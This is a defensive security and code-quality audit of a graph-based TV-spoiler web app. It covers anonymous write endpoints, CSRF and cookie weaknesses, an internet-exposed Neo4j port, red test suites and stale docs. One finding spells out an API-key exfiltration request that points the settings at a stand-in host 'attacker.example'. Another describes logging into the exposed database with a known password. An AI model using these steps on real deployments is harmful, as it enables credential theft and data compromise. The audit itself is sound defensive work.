# PROBLEMS — HD Graf Cehennemi Audit (2026-08-04)

> **Scope:** Read-only audit of the repository at `main` (HEAD `9caa85b`, 47 commits ahead of `origin/main`).
> Every claim below was verified against **live source**, the **running backend** (`http://localhost:8000`, `/openapi.json` ground truth), **live pytest/vitest runs**, and **git history** on 2026-08-04. Nothing here is speculation.
>
> The project is being deployed publicly. The verdict is: **it is not deployable as-is.** The most expensive features (auth, spoiler-safety, candidate review, chat) sit on top of an API where **14 of 45 operations are anonymous writes across 11 path templates** — including "promote claim to canonical" — and the only deployment recipe (`docker-compose.yml`) **exposes the Neo4j database itself to the internet with a hardcoded password** (#31). The docs document many of these holes honestly and then ship them anyway.

---

## CRITICAL — security / will get the operator owned

### 1. Fourteen write operations require no authentication (11 path templates)
The API surface is 33 path templates / 45 operations (verified from the live `/openapi.json`). Exactly 19 paths need **no session**, and 14 of those are **mutations**:

| Anonymous write endpoint | File |
|---|---|
| `POST /api/series/{id}/notes`, `PATCH`/`DELETE /notes/{note_id}` | `api/user_content.py:52,103,120` |
| `POST/PATCH/DELETE /custom-nodes`, `/custom-relationships` (6 routes) | `api/user_content.py:124-201` |
| `POST /candidates/ingest` | `api/candidates.py:107` |
| `POST /candidates/{id}/approve`, `/reject`, `PATCH /candidates/{id}` | `api/candidates.py:175,231,285` |
| `POST /revisions/{revision_id}/revert` | `api/revisions.py:125` |

No `CurrentUserDependency` anywhere in `user_content.py`, `candidates.py`, or the revert route. The frontend never gates on auth either — `useAuth` is imported only in `App.tsx` and `LoginPage.tsx`; `DetailPanel`, the notes tab, and the custom-content dialogs render for anonymous visitors. **Fix:** put every mutation behind `require_current_user` and bind records to `user["id"]`.

> **FACT-CHECK CORRECTION (2026-08-10, ledger accuracy verification):** the frontend-reachability half of this finding was **false at the audit snapshot**. At HEAD `9caa85b`, `frontend/src/App.tsx` `AppContent` (lines 343-359) returned `<LoginPage />` for both the `unauthenticated` and `error` auth states, and only the `authenticated` branch rendered `AuthenticatedApp` — the sole place `DetailPanel` (`App.tsx:308`), the notes tab, and the custom-content dialogs existed. Anonymous visitors therefore could NOT reach the graph workspace or its write controls through the UI. The API-side finding stands (the 14 write operations were genuinely anonymous at `9caa85b`), and the `useAuth`-imports grep (`App.tsx` + `LoginPage.tsx` only) was accurate — but the inference that the frontend "never gates on auth" and rendered mutation controls to anonymous visitors was not.

### 2. Any anonymous visitor can promote claims to canonical — graph poisoning
`POST /api/series/{series_id}/candidates/{claim_id}/approve` (`candidates.py:175-213`) flips `status = 'canonical'` on any claim with `origin: 'candidate'` and logs a revision. Combined with anonymous `ingest` (`candidates.py:107`), a stranger can: inject arbitrary claims → approve them → **permanently alter the canonical knowledge graph every visitor sees**. The "candidate review workflow" the README advertises has no reviewer — the door is unlocked. **Fix:** admin/owner gate; candidates must never be writable anonymously.

### 3. Anonymous revert can overwrite any resource state
`POST /api/series/{id}/revisions/{revision_id}/revert` (`revisions.py:125`) restores a `before` snapshot onto live nodes. It is unauthenticated. Anyone can roll back (or restore) any revisioned resource — including user content and candidate state — without permission. **Fix:** auth + ownership check on the target resource.

### 4. User content has no owner — everyone can edit and delete everyone else's data
`NoteResponse` (`domain/user_content.py:131`) has **no `user_id` field**. Notes, custom nodes, and custom relationships are global. `update_note`/`delete_note` match by id only. The docs admit it: `ARCHITECTURE.md:282` — "these routes do not bind an authenticated owner ID, so content is not isolated per user"; `ARCHITECTURE.md:672` — "current user-content records are not bound to an `AppUser` owner ID". On a public site this is vandalism + data-loss-as-a-service. **Fix:** owner binding, owner-only mutations, per-user reads.

### 5. Any logged-in user can steal the operator's LLM API key (self-documented hole)
`PUT /api/settings/llm` is "auth required" — but auth means *any Google account*. The settings are a single **global** `:AppSetting {key:'llm'}` node. The code ships with the hole written into its own docstring (`domain/settings.py:26-29`):

> "Any authenticated user can still redirect the shared provider to an external attacker-controlled https:// host — closing that requires per-user-scoped or admin-gated settings, which is a separate, larger change tracked outside this fix."

Attack: sign in → PUT `{provider: "openai_compatible", base_url: "https://attacker.example", model: "x", enabled: true}` → send a chat message → the backend sends the stored key as `Authorization: Bearer <key>` (`llm/provider.py:132`) or `x-goog-api-key` (`provider.py:369`) **to the attacker's host**. One request, key gone. The `http`/`https` scheme allowlist (`settings.py:30`) deliberately allows SSRF into internal hosts too. The key is also stored **plaintext** in Neo4j. **Fix:** admin-gated settings, per-user provider config, key at-rest encryption, allowlist of provider hosts.

### 6. No rate limiting, no LLM budget, no abuse protection — the operator pays for everyone
**RESOLVED** — verified fixed as of 2026-08-04: `backend/app/services/rate_limit.py` now implements a Redis-backed rate limiter (`pyrate_limiter`, atomic `RedisBucket`) wired into `api/auth.py` (login), `api/chat.py` (chat-send), and `api/user_content.py` (content-write, every mutation route) — see commit `1f8a3e9`. The `grep` below and the original zero-hits finding no longer reflect current code; this is left in place for the audit trail.

`grep -rni "rate.limit|slowapi|throttle"` across backend/frontend: **zero hits**. The only guard is a per-user in-memory generation slot (`services/chat.py:48-71`) — one concurrent LLM stream per user, in a process-local dict. There is no daily cap, no token budget, no per-user cost ceiling, no general request limiter. Anyone with a free Google account can stream `max_length=4000`-char questions (`domain/chat.py:82`) through up to 4 tool rounds × 40 context items × 800 output tokens per call, unbounded, and the owner's API bill grows. Also: the in-memory slot breaks under `uvicorn --workers N` (each worker gets its own slot → limit silently multiplied). **Fix:** real rate limiting + per-user budget + Redis/DB-backed slots.

### 7. The Google-bypass backdoor is armed in this deployment's environment
**RESOLVED** — verified fixed as of 2026-08-04: `grep -rni "dev_auth|AUTH_DEV_CODE|/auth/dev"` across `backend/app` returns **zero matches** — the `POST /api/auth/dev` route and the dev-login code path no longer exist (removed in commit `e093f81`, already documented under finding #55's fact-check correction). The `AUTH_DEV_CODE` variable, if still present in a local `.env`, is dead config with no route to consume it. This finding is left in place for the audit trail; the description below reflects the state before the removal.

The live root `.env` defines **`AUTH_DEV_CODE`** (verified: key names `GOOGLE_CLIENT_ID`, `AUTH_DEV_CODE`). `POST /api/auth/dev` (`api/auth.py:206`) then lets anyone who knows the code sign in as the fixed `dev-local` identity and do everything a user can do — including the settings exfiltration in #5. The route is documented "Never enable in production"; a copied `.env` is the classic way it ships. **Fix:** delete the variable, or gate the route on a debug flag that fails closed when not in debug.

### 8. Session cookie defaults to insecure, and the example config ships insecure
**RESOLVED** — verified fixed as of 2026-08-04: `core/config.py:34` now defines `session_cookie_secure` with `default=True`, and `.env.example:10` is `SESSION_COOKIE_SECURE=true`. The cookie is Secure-by-default in production; local HTTP dev must explicitly opt out. This finding is left in place for the audit trail; the description below reflects the state before the fix.

`SESSION_COOKIE_SECURE=false` is the default (`core/config.py:26-29`) **and** the value in `.env.example:10`. On any HTTP deployment the session cookie travels plaintext — session hijack with one packet capture. The cookie is the ONLY credential. **Fix:** default `true`, fail deployment on false outside localhost, HSTS on the host.

### 9. Sessions are never cleaned — unbounded DB growth and a write on every request
`repository/session.py:5-16` documents the cleanup query and then says: "**This is not implemented in this task** — the app relies on lazy rejection of expired/revoked sessions." Every authenticated request calls `AuthService.get_current_user` → `session_repo.refresh` (`services/auth.py:168`) → a Neo4j **write per request** that slides a 7-day TTL. Expired/revoked `Session` nodes accumulate forever; an active user's session literally never expires. **Fix:** background sweep + no slide-on-read (or slide with a write-threshold).

### 10. CSRF defense fails open and doesn't cover logout
`verify_origin` (`api/auth.py:92-97`): "If neither Origin nor Referer is present, **allow the request through**." Non-browser clients and privacy-stripped browsers sail past. `POST /api/auth/logout` (`auth.py:284`) has **no** `verify_origin` dependency at all — trivially CSRF-logoutable. Cookie auth without a CSRF token and a fails-open origin check is not a CSRF defense. **Fix:** reject missing Origin on state-changing routes (or require a double-submit token); add the dependency to logout.

---

## HIGH — the product's core promise is broken or unverifiable

### 11. Anonymous users can inject spoiler content visible to everyone
Notes attach to any `Character`/`Claim` at the target's `visible_from_order` and are rendered to all visitors (global, see #4). An anonymous visitor can note "Dexter's brother is the Ice Truck Killer" on an order-1 character and every first-time viewer sees it. There is no moderation, no report flow, no delete-by-staff, no content policy. The spoiler guarantee is trust-based. **Fix:** auth-gate writes (#1), moderation/flagging, or make notes private-by-default.

### 12. The entire future graph is fetchable anonymously
`GET /api/series/{id}/graph?visible_until_order=N` accepts a **client-chosen** boundary; anonymous callers keep the requested order verbatim (`api/graph.py:83-87` + `get_optional_current_user` never raises). Same for `/episodes`. Any anonymous visitor requests `visible_until_order=999` and downloads the whole show. The spoiler boundary only holds for the LLM chat (server-persisted progress). If "spoiler-safe public browsing" is the product, the read side must not trust the client. **Fix:** anonymous = boundary 1 (or a session cookie), authenticated = persisted progress.

### 13. Candidate reads default to "everything, all visibility levels"
`GET /candidates` takes `visible_until_order` as **optional** — omitted, it returns candidates at all visibility levels (`candidates.py:130-136`, documented in `API.md:264`). Revision routes apply the boundary without checking it against a persisted episode (`API.md:223`). The "spoiler-safe by default" posture has a gaping hole in its own review workflow. **Fix:** require the boundary, resolve server-side like everything else.

### 14. The backend test suite is RED at HEAD — 3 failing tests shipped
Verified live run (2026-08-04): `pytest backend/tests/test_seed_idempotency.py test_openapi_contract.py -q` → **3 failed, 14 passed**:
```
FAILED test_seed_idempotency.py::test_seed_is_idempotent_and_complete
FAILED test_seed_idempotency.py::test_constraints_visibility_and_provenance
FAILED test_seed_idempotency.py::test_setup_preserves_user_layer_and_deleted_resources_stay_deleted
{'relationships': 33} != {'relationships': 27}
```
The "documented baseline" of 410 passed / 3 failed means the project's own runbook accepts a red suite. A red suite cannot gate a public release. **Fix:** make the seed assertions order/state-independent (counts vs live DB with user content is inherently unstable) or isolate seed tests on a scratch database.

### 15. The test suite runs against the SAME live Neo4j as the application
There is no mock DB layer — integration tests mutate the production graph. Documented incidents from this project's own runbook: `test_settings_api.py` teardown **wiped the user's stored LLM API key** from `:AppSetting`; a progress fixture teardown **deleted the user's real watch progress**; aborted full-suite runs leave half-created nodes and a ~500s hang until reseed. On a public deployment, running the tests is a production incident. **Fix:** containerized throwaway Neo4j per run (Testcontainers), never the live graph.

### 16. Frontend lint: 28 errors at HEAD — including real React 19 bugs
Verified: `npm run lint` → **28 errors, 0 warnings**. Not style nits: `react-hooks/refs` "Cannot update ref during render" in `useChatSessions.ts`, `useNotes.ts`, `useRevisions.ts` (writing `fetchKeyRef.current` in the render body — a genuine stale-ref correctness bug under React 19 double-render), plus `preserve-manual-memoization` findings in `DetailPanel.tsx`/`GraphCanvas.tsx` and `no-explicit-any` in tests. The project's own runbook says "plans asserting lint reports 0 errors cannot pass on the pre-existing debt". **Fix:** refs in effects; fix or formally delete the memoization violations; then make lint a CI gate.

### 17. The frontend suite is flaky — 1 failure appears only in the full run
Verified: full run `NODE_ENV=test CI=1 npx vitest run` → **185 passed / 1 failed** (`App.test.tsx` "runs select → confirm → fetch → render → inspect end-to-end"); the same file in isolation → **15/15 passed**. An order/timing-dependent e2e test means the suite cannot be trusted as a gate and the 26-file suite takes 46s+ with setup/import overhead. **Fix:** make the e2e flow deterministic (mock timers/raf, isolation between files), parallel-safe setup.

### 18. God-files with a history of silent regressions
`retrieval/pipeline.py` 980 lines, `retrieval/tools.py` 852, `llm/system_prompt.py` 837, `repository/change_set.py` 828, `repository/user_content.py` 748, `api/candidates.py` 321. The runbook documents a **duplicate-function shadowing incident** in `pipeline.py` (the old definition silently won; 16 failing tests) and a patch-tool eaten-decorator incident in `api/auth.py`. Single-purpose modules with hundreds of lines of Cypher constants inline breed exactly these. Also: the frontend build emits one chunk **>500 kB** (verified build warning) — no code splitting.

### 19. No migrations — schema is whatever seed.py last wrote
Constraints/indexes live in `seed.py` as idempotent `CREATE CONSTRAINT IF NOT EXISTS` runs; there is no versioned migration path, no schema history, no upgrade story. Two different deployment states will silently diverge (the `test_seed_idempotency` failures in #14 are the same disease). `test_seed_idempotency` also asserts an **exact constraint-label set**, so any future constraint addition breaks the suite (documented incident: the `AppSetting key` constraint). **Fix:** real migrations; seed = data, not schema.

### 20. Error-code contract is self-contradictory
`ErrorDetail.code` is validated `pattern=r"^[a-z][a-z0-9_]*$"` (`core/errors.py:26`) — lowercase-only — while the API actually emits **uppercase** codes: `AUTH_UNAUTHENTICATED`, `LLM_DISABLED`, `LLM_PROVIDER_UNAVAILABLE`, `AUTH_ORIGIN_NOT_ALLOWED`… (`api/auth.py:35-42`, `llm/provider.py`). Frontend `ApiError` normalization (`client.ts:16-23`) has to paper over the inconsistency. A documented "stable machine-readable error contract" that contradicts its own regex is exactly the kind of fake-stability that bites API consumers. **Fix:** pick one case, update the contract tests.

---

## MEDIUM — "well documented crap": the docs drift, overclaim, and underclaim

### 21. `docs/API.md` route counts are stale — off by exactly the dev-login route
`API.md:10` claims "**44** method/path operations over **32** path templates". Live `/openapi.json`: **45 operations / 33 paths**. The missing entry is `POST /api/auth/dev` — the backdoor route (#7) — which the flagship API doc doesn't even list. This file is not test-locked (only `frontend-api-contract.md` is), so it rots. **Fix:** generate API.md from `app.openapi()` in CI or delete the hand-maintained counts.

### 22. `docs/ARCHITECTURE.md` claims the LLM "always emits proposed_change_set: null" — false since 07-07
`ARCHITECTURE.md:562`: "the current chat/retrieval pipeline does not create or return them and **always emits `proposed_change_set: null`**". Since commit `67f4a58` (07-07) the pipeline ships a 12th allowlisted tool, `propose_changeset`, wired into the done-envelope `proposed_change_set`. The doc describing the system's own headline capability (agent-proposed graph edits) is outdated by its most recent feature.

### 23. `docs/ARCHITECTURE.md` §"Known gaps" lists fixes that already landed
`ARCHITECTURE.md:596`: "The progress update path accepts any positive integer and does not verify that it matches an Episode" — **false** since 07-02 (`services/progress.py:92-123` rejects non-persisted orders, D-09). Same paragraph: "`GRAPH_SUMMARY_COUNTS_QUERY` counts claims without gating their subject/object endpoints" — **false** since 07-05 (EXISTS endpoint subqueries, `tools.py:253-262`). The "known gaps" section is a museum of fixed bugs. (The `GET_EVIDENCE_QUERY`/`GET_SOURCES_QUERY` claim is still literally true — they gate the evidence/source and the relationship but never re-check `claim.visible_from_order` — a live, smaller gap.)

### 24. `docs/ROADMAP.md` puts the blockers on the backlog instead of the release train
`ROADMAP.md:207-209` (unchecked):
> - Apply consistent authentication/ownership to user-content, revision, and candidate mutations.
> - Add comprehensive CSRF protection for cookie-authenticated state changes.
> - Define production authorization roles/policy if multi-user deployment is approved.

That is the roadmap **openly deferring the #1-#5 findings in this document** to "later". A public deployment of this repo is the roadmap admitting the hole and shipping anyway. The roadmap's 59-checkbox ledger is also stale in the other direction (implemented milestones 1-9 marked unchecked — prior audit, `roadmap-fix-iteration-reverification-2026-08-02`).

### 25. Committed junk: a PyCharm hello-world script and untouched Vite boilerplate
`main.py` at the repo root is the **PyCharm template** (`print_hi('PyCharm')` — literally "Press Shift+F10 to execute it"). `frontend/README.md` is the **unmodified create-vite boilerplate** ("React Compiler is not enabled on this template…"). These are committed. Root `index.html` (60 KB inline landing page) is the only thing GitHub Pages can serve — the actual app has no static build artifact story (see #26). Junk in the root of a repo is the first thing a code reviewer and a prospective deployer sees.

### 26. There is no deployment story at all — "deploy to public" starts from zero
`docs/DEPLOYMENT.md` states it plainly: no backend/frontend Dockerfiles, no CI/CD, no production target. Verified: **no `.github/` directory exists** in the repo. The GitHub Pages commit (`273221e`) deploys the static landing page only. What's missing for a public launch: app container images, reverse proxy/TLS termination, CI pipeline, env/secret management, log aggregation, monitoring/alerting, backups of Neo4j, and a documented multi-user operations model. "Polished vertical prototype" is accurate; "deployable" is not.

### 27. Docker Compose hardcodes credentials; `.env.example` ships different ones
**RESOLVED** — verified fixed as of 2026-08-04: `docker-compose.yml:12` is `NEO4J_AUTH: neo4j/${NEO4J_PASSWORD:-change-me}` — env-var driven, not hardcoded, and it now shares the same `NEO4J_PASSWORD` variable and `change-me` fallback as `.env.example`. There is no longer a two-password mismatch. This finding is left in place for the audit trail; the description below reflects the state before the fix.

`docker-compose.yml:12` hardcodes `NEO4J_AUTH: neo4j/hdgraf-local-password`. `.env.example:3` ships `NEO4J_PASSWORD=change-me`. Two files, two passwords, one silent misconfiguration for anyone who copies `.env.example` (the documented startup path in DEPLOYMENT.md) and starts Compose. **Fix:** single source of truth, `.env`-driven, `change-me` rejected by the backend on startup outside dev.

### 28. No LICENSE, no CONTRIBUTING, and seed data hotlinks third-party images
No `LICENSE` or `CONTRIBUTING.md` in the repo (verified). `data/dexter/seed/characters.json` hotlinks `static.wikia.nocookie.net` (Fandom) images for every character — copyrighted promotional stills, loaded directly from the browser on a public site: legal exposure, hotlink breakage, and a privacy leak (visitors hit Fandom's servers). **Fix:** license decision first; self-host or drop images.

### 29. The operator's own machine is the single point of failure
`main` is **47 commits ahead of `origin/main`** — the entire Phase 6-7 body of work exists only on this laptop. Working tree additionally carries uncommitted deletions (root `ROADMAP.md`, `HD_GRAF_CEHENNEMI_CODING_AGENT_SPEC_V2.md`), untracked `.hermes/` and `docs/internship-report/`, and a perpetually-dirty `.planning/config.json`. Verified 2026-08-04: the remote `https://github.com/vinnipukh/hdgrafcehennemi.git` **returns `Not Found` from the GitHub API** (private or removed) — so even the 47-commit-ahead remote is not a confirmed backup. One dead disk and the last two months of "documented" progress are gone. **Fix:** push, add CI that runs the suites, and get the suite green first (#14, #17).

### 30. Minor but symptomatic details that will bite a public operator
- `frontend/.env.example` ships `VITE_API_BASE_URL`, which is read in **exactly one place** — the SSE stream fetch (`frontend/src/api/chat.ts:82-84`); every other `frontend/src/api/*.ts` call hardcodes `/api` via the shared client. The docs' earlier "doesn't exist" and "is used" claims are both half-right: it exists, and it is used only on the stream path — a hosted frontend hitting a backend on another origin works for chat but breaks every other API call.
- `PUT /api/settings/llm` persists **whitespace-only** API keys (no strip) — documented in `ARCHITECTURE.md:610` as known behavior; a settings UI that accepts an all-spaces key and reports "configured" is a trap.
- Backend logs a deprecation at startup: Starlette `httpx`/`httpx2` warning.
- `pip`-era leftovers in `.gitignore` ("Streamlit" section) and a first commit that mentions a `requirements.txt` that has since become a generated `uv export` artifact duplicating `uv.lock` (two lockfiles to drift).
- `verify_origin` and CORS share one origin list, so adding a new frontend origin silently widens CSRF acceptance — no separate CSRF allowlist.
- LLM chat questions capped at 4000 chars but there is no server-side normalization of whitespace-only questions (they are stripped by `StrictModel` but still bill a tool round).

> **FACT-CHECK CORRECTION (2026-08-10, ledger accuracy verification):** the "still bill a tool round" half of this bullet is **incorrect** at the snapshot. `ChatMessageCreateRequest.question` is `str = Field(min_length=1, max_length=4000)` (`backend/app/domain/chat.py:82`) on `StrictModel` (`backend/app/domain/user_content.py:88`, `model_config = ConfigDict(extra="forbid", str_strip_whitespace=True)`): a whitespace-only value is stripped to `""` and fails validation with `string_too_short` (422) before any pipeline call, so it never reaches generation and never bills a tool round. The "capped at 4000 chars" half stands; the billing half does not.

---

## SECOND PASS — deployment blockers from the full code walk (2026-08-04)

The first pass covered the API surface, suites, and docs. This pass walked the DB layer, auth internals, chat pipeline, revisions, and the deployment recipe. Ten more blockers, verified against source.

### 31. CRITICAL — the only deployment recipe exposes the Neo4j database itself to the internet
**RESOLVED** — verified fixed as of 2026-08-04: `docker-compose.yml` now binds both ports to `127.0.0.1` only (lines 7-9: `"127.0.0.1:7474:7474"`, `"127.0.0.1:7687:7687"`), uses an env-driven credential (`NEO4J_AUTH: neo4j/${NEO4J_PASSWORD:-change-me}`, line 12) instead of a hardcoded password, and pins the image to `neo4j:2026.06.0-community` (line 3) instead of a floating tag. Neo4j is no longer reachable from any interface but localhost with this recipe. This finding is left in place for the audit trail; the description below reflects the state before the fix.

`docker-compose.yml` — the ONLY database deployment artifact in the repo — publishes **`7474:7474` and `7687:7687` to every interface** with a **hardcoded credential** (`NEO4J_AUTH: neo4j/hdgraf-local-password`, line 12) and a **floating `neo4j:2026-community` tag** (no version pin). Anyone who finds the host can `bolt://<host>:7687` straight in with the known password and read/write the entire graph — user PII, session tokens, the plaintext LLM API key in `:AppSetting` — completely bypassing the application, its auth, and its spoiler filtering. There is no Neo4j TLS configuration anywhere. Deploying this recipe as-is is an instant full database dump. **Fix:** do not publish DB ports (backend-only network), force a strong password at startup, pin the image tag, enable DB TLS, and firewall the port.

### 32. Auth session id collision — two logins in the same second = constraint error
`Neo4jSessionRepository.create` builds the session id as `f"session:{user_id}:{int(now)}"` (`repository/session.py:209`) — second-resolution timestamp — while `seed.py:192` enforces `session_id_unique` (`REQUIRE s.id IS UNIQUE`). Two concurrent logins (or two tabs) by the **same user within one second** produce an identical id → `ConstraintError` → the login request fails with a 409/500. Intermittent, auth-path, and invisible in single-user local testing. The `token_hash` is random — the id need not encode anything at all. **Fix:** `session:{uuid4()}`.

### 33. Revisions carry no user attribution — the audit log cannot answer "who"
`RevisionRepository.log_revision` (`revisions/__init__.py:64-90`) has **no `user_id` parameter**; `Revision` nodes store no actor. Every approve/reject/revert/note-edit revision is anonymous. The README advertises "revision history … enabling inspect-and-revert workflows" — but on a public site with anonymous writes (#1-#4) the history is a list of ghost edits with no accountability, no moderation trail, and no way to reverse a vandal's actions selectively. **Fix:** bind `user_id` (or `origin: 'anonymous'`) on every revision; make revert owner/admin-gated.

### 34. Candidate approve/reject return a `revision_id` that does not exist
`candidates.py:202,252` fabricate `rev_id = f"revision:{sha256(approve:{cid}:{now})}"` and return it in the API response, while `RevisionRepository.log_revision` actually persists `id=f"revision:{uuid4()}"` (`revisions/__init__.py:78`). The returned `revision_id` is never stored — a client that follows the id gets a 404. The response lies about its own side effect. **Fix:** return the id `log_revision` actually generated.

### 35. Chat turns persist the user message before generation — failures leave orphans, and stream errors are invisible in the logs
`answer_stream` writes the user message to the graph **before** running the pipeline (`services/chat.py:242-249`). If the generation fails mid-turn (provider failure, timeout, client disconnect), the user message is permanently stored with **no assistant reply** and no `status` field to mark it failed (`ChatMessageResponse` has no status). Worse: if the pipeline ends without a `done` event, `final_done` is `None` and `final_done.citations` raises `AttributeError` — which `api/chat.py:239`'s bare `except Exception` converts to a generic `LLM_STREAM_FAILED` event **without logging anything**. Every mid-stream failure is invisible to the operator; debugging requires reproducing the exact prompt. **Fix:** persist the user message after (or alongside) the turn with a status column; log the exception class/message before emitting the generic event.

### 36. The app connects to Neo4j as the admin superuser — no least privilege, all-defaults driver
`Neo4jDatabase.open` (`graph/database.py:24-30`) uses the configured credentials directly — which, per the only deployment recipe, are the **admin `neo4j` account**. There is no dedicated application role, no per-label/per-query privileges, no `dbms.security` setup. A compromise of the app (any of #1-#5) is a full database compromise. The driver is also configured with zero explicit options — no connection timeouts, no pool limits, no TLS/trust settings — so production behavior silently depends on driver defaults and the URI scheme. **Fix:** create a least-privilege app user (no `dbms.*` admin), tune pool/timeouts, pin TLS.

### 37. The fail-closed visibility policy has a fail-open-to-500 edge
`validate_visibility_order` (`spoiler/policy.py:62-73`) does `if order < 1` — with `None` that raises `TypeError`, not `InvalidVisibilityOrder`. `assert_visibility_invariants` (`policy.py:202-203`) calls it on persisted progress fields that may be `None` (Neo4j Community has no property-existence constraints — `seed.py:116-119` says so explicitly). A malformed persisted progress row (e.g. `view_as_of_order: null` from an earlier buggy write) → uncaught `TypeError` → HTTP 500 where the contract says 422. **Fix:** `if order is None or order < 1`.

### 38. No security headers, and CORS wildcards with credentials
`main.py:82-88` adds only CORS. There is no CSP, HSTS, `X-Content-Type-Options`, `X-Frame-Options`, or `Referrer-Policy` anywhere — on a site that will serve user-generated content (#1, #11), the absence of a Content-Security-Policy is a real exposure (any injected markup becomes an XSS vector instead of a dead tag). CORS also uses `allow_methods=["*"]` + `allow_headers=["*"]` together with `allow_credentials=True`. **Fix:** emit security headers (middleware or reverse proxy), narrow methods/headers.

### 39. Zero observability — no structured logs, no request logs, no metrics
The only logging in the app is a handful of `logger.warning(...)` calls in `api/auth.py`; no handler configuration, no request logging, no metrics endpoint, no tracing, no Sentry-style error reporting. `core/errors.py` sanitizes errors and then **drops them** — the original exception is not logged by the handlers (`install_error_handlers`, `errors.py:143-168`). Combined with #35, a public deployment is a black box: the operator cannot see failed logins, failed streams, or DB errors. **Fix:** structured logging + request middleware + exception logging in the handlers.

### 40. Core modules have no direct tests
No test file exists for `graph/database.py` (the driver layer everything rides on), `graph/ontology.py`, `services/series.py`, `api/series.py`, `api/deps.py`, `core/config.py`, `llm/system_prompt.py` (the 837-line prompt is only asserted indirectly through pipeline tests), or `main.py` (lifespan/health). The DB layer — connection lifecycle, `execute_write` semantics, the `$query`-parameter collision class — is completely untested directly. **Fix:** unit tests for the DB wrapper and policy/service layer against a disposable driver (Testcontainers), per #15.

> **FACT-CHECK CORRECTION (2026-08-10, ledger accuracy verification):** the blanket "no direct tests" claim and the `system_prompt.py` parenthetical were **false at the snapshot**. At HEAD `9caa85b`: `services/series.py`'s `SeriesService` is directly tested in `backend/tests/test_episode_masking.py`; `llm/system_prompt.py`'s `compose_system_prompt` is directly imported and behaviorally asserted in `backend/tests/test_prompt_injection.py` (e.g. `test_system_prompt_names_delimiters_and_frames_content_as_data` calls `compose_system_prompt(language)`); and `main.py` is directly imported (`importlib.import_module("backend.app.main")`, `backend/tests/test_graph_api.py:55`) with `/health` assertions. The genuine snapshot gap — no direct test file at all — is `graph/database.py`, `graph/ontology.py`, `api/series.py`, `api/deps.py`, and `core/config.py`; the DB-layer sentence of the finding stands.

### 41. Small lies in the code that erode trust
- `repository/settings.py` docstring claims "A uniqueness constraint on `key` is created by the seed routine" — **the constraint was removed from `seed.py`** (it broke `test_seed_idempotency`'s exact-set assertion; see the project runbook). The code documents a constraint that does not exist.
- The SettingsPage strips the API key client-side (`apiKey.trim()`, `SettingsPage.tsx:86`) but the backend persists raw values — whitespace-only keys via direct API calls still land in the store (acknowledged in `ARCHITECTURE.md:610`).
- `api/candidates.py` reaches into `repo._db` (private attribute) from the route layer instead of exposing a repository method — the layering the docs claim ("repository boundary") is breached where it matters most.
- `load_ontology()` (`graph/ontology.py:83`) is **not cached** and is called at module import time by `api/graph.py:31` (`USER_RELATIONSHIP_TYPES`) — every worker startup re-reads the YAML files, and a missing ontology file becomes an import-time crash of the whole app.

---

## THIRD PASS — live-system findings (backend + browser console, 2026-08-04)

Verified against the user's running dev stack: uvicorn backend logs and the browser console.

### 42. HIGH — Google login dies with `503 internal_error (NameError)` on any verification error (reproduced)
`backend/app/services/auth.py::ProductionGoogleVerifier.verify` line 73: `except google.auth.exceptions.TransportError` — but **`google` is never bound in the function scope** (the lazy `from google.oauth2 import id_token` binds only `id_token`). The except clause is only *evaluated when an exception occurs*, so:
- valid token → no exception → login works (one `200 OK` observed in the logs);
- any verification failure (wrong audience, expired token, cert-fetch error) → `NameError: name 'google' is not defined` → caught by the route's generic handler → misleading `503 AUTH_SERVICE_UNAVAILABLE`.

Reproduced directly: `ProductionGoogleVerifier().verify("garbage-token", "test-client")` → `NameError`. The likely day-to-day trigger: backend `GOOGLE_CLIENT_ID` (root `.env`) ≠ frontend `VITE_GOOGLE_CLIENT_ID` (`frontend/.env.local`) → audience mismatch on every token → **every Google login 503s**. Observed 8× `google_auth: internal_error (NameError)` against one 200. **Fix:** module-top `from google.auth.exceptions import TransportError` + `except TransportError`; log the traceback (#39).

### 43. HIGH — Confirm-watch `POST /progress` always 422s; watch progress never persists
`frontend/src/api/progress.ts::updateProgress` (line 36) **unconditionally** adds `visible_until_order` to the body; `frontend/src/hooks/useWatchProgress.ts::confirmChange` (165-168) also adds `watched_through_order` (+`view_as_of_order`) → the payload carries `visible_until_order` AND `watched_through_order`. `backend/app/domain/progress.py::ProgressUpdateRequest._exactly_one_boundary_field` (68-83) rejects exactly that combination ("Provide either watched_through_order or the legacy visible_until_order, not both") → **422 on every confirm**. The FE catch (`useWatchProgress.ts:180-192`) then commits the change **optimistically** → the UI shows progress confirmed while the backend never persisted it; it snaps back after reload. The view-only path has the same disease in reverse: it also ships the legacy `visible_until_order` (a watched-confirm alias per the model docstring), so "view-only" clicks actually confirm watched progress server-side — the D-05 split is broken on the wire. Observed: `POST .../progress 422` in backend logs + `Failed to load resource: 422` on `/api/series/series_dexter/progress` in the browser console. **Fix:** stop sending `visible_until_order` from the FE (or drop the legacy alias from the BE validator); assert the wire shape in FE tests — they mock `updateProgress`, the same blind spot class as the 08-01 chat 422.

### 44. MEDIUM — Neo4j `01N52 property key does not exist` storm — the live DB is stale vs the seed
`backend/app/spoiler/filter.py::SERIES_EPISODES_QUERY` selects `synopsis_visible_from_order` and `image_visible_from_order`; the live `Episode` nodes predate those fields (added to `data/dexter/metadata/episodes.json` in the 07-06 media-safety era) and were never reseeded → Neo4j emits `01N52` warnings on every episodes query. Masking output is unaffected (META-02: absent fields stay absent), but this is direct evidence the DB is out of sync with the seed — the same disease as the 3 red seed tests (#14). **Fix:** reseed (`uv run --project backend python -m backend.app.graph.setup` — MERGE-based, preserves user content); add a startup schema check so drift can't hide again.

### 45. HIGH — No error boundary anywhere; a Rules-of-Hooks violation blanked the app (observed)
Browser console during an active edit of `frontend/src/hooks/useChatMessages.ts`:
```
React has detected a change in the order of Hooks called by ChatPanel.
15. useRef                 useRef
16. useEffect              useRef
Uncaught Error: Should have a queue ... at ChatPanel (ChatPanel.tsx:103:47)
An error occurred in the <ChatPanel> component. Consider adding an error boundary...
```
A hook at position 16 flipped between `useEffect` and `useRef` across renders — a conditional hook / early return in the in-flight `useChatMessages` edit, detonating at `ChatPanel.tsx:103` (`useState(chatMessages.status)`). React 19 unmounts the **entire root** on an uncaught render error, and this app has **zero error boundaries** (`App.tsx`/`main.tsx`) — one bad save = blank page for everyone. The current working tree is hook-legal again (ChatPanel + useChatMessages tests **17/17 pass**), but the standing problems remain: no error boundary, and committed debug noise `console.log('[GC-MODULE] GraphCanvas module loaded')` at `GraphCanvas.tsx:22`. **Fix:** error boundary at the root + per-panel; delete debug logs; keep hooks unconditional.

---

## APPENDIX — Problem → file:method → effect map

